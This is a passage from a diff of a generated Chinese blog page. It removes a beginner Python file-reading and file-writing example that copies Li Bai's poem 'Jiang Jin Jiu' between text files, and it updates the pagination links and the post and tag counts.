result:</span><br><span class="line">        print(&quot;错误信息：&quot;,result)</span><br><span class="line">    f.write(&quot;&quot;&quot;</span><br><span class="line">               将进酒</span><br><span class="line">            李白 〔唐代〕</span><br><span class="line">    君不见黄河之水天上来，奔流到海不复回。</span><br><span class="line">    君不见高堂明镜悲白发，朝如青丝暮成雪。</span><br><span class="line">    人生得意须尽欢，莫使金樽空对月。</span><br><span class="line">    天生我材必有用，千金散尽还复来。&quot;&quot;&quot;)</span><br><span class="line">    f.close()</span><br><span class="line">    try:</span><br><span class="line">        f &#x3D; open(&quot;gushi.txt&quot;, &quot;r&quot;)</span><br><span class="line">    except Exception as result:</span><br><span class="line">        print(&quot;错误信息：&quot;, result)</span><br><span class="line">    content &#x3D; f.readlines()</span><br><span class="line">    f.close()</span><br><span class="line">    return content</span><br><span class="line"></span><br><span class="line">def Wfile(str):</span><br><span class="line">    #name &#x3D; input(&quot;输入要写入的文件名：&quot;)</span><br><span class="line">    #f &#x3D; open(name,&quot;w&quot;)</span><br><span class="line">    try:</span><br><span class="line">        g &#x3D; open(&quot;copy.tex&quot;, &quot;w&quot;)</span><br><span class="line">    except Exception as result:</span><br><span class="line">        print(&quot;错误信息：&quot;, result)</span><br><span class="line">    for s in str:</span><br><span class="line">        g.write(s)</span><br><span class="line">    g.close()</span><br><span class="line"></span><br><span class="line">content &#x3D; Rfile()</span><br><span class="line">Wfile(content)</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1474,7 +1709,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-count">62</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1487,7 +1722,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
